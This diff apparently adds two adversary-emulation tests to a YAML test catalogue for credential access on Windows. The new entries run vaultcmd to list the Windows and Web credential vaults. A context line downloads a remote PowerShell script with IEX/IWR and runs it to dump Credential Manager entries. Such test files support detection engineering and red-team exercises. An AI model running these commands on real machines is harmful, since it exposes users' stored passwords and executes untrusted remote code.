@@ -49,3 +49,21 @@ atomic_tests:
     elevation_required: false
     command: |
       IEX (IWR 'https://raw.githubusercontent.com/skar4444/Windows-Credential-Manager/4ad208e70c80dd2a9961db40793da291b1981e01/GetCredmanCreds.ps1' -UseBasicParsing); Get-CredManCreds -Force
+- name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Windows Credentials] 
+  description: This module will enumerate credentials stored in Windows Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      vaultcmd /listcreds:"Windows Credentials" /all
+- name: Enumerate credentials from Windows Credential Manager using vaultcmd.exe [Web Credentials]
+  description: This module will enumerate credentials stored in Web Credentials vault of Windows Credential Manager using builtin utility vaultcmd.exe
+  supported_platforms:
+  - windows
+  executor:
+    name: powershell
+    elevation_required: false
+    command: |
+      vaultcmd /listcreds:"Web Credentials" /all
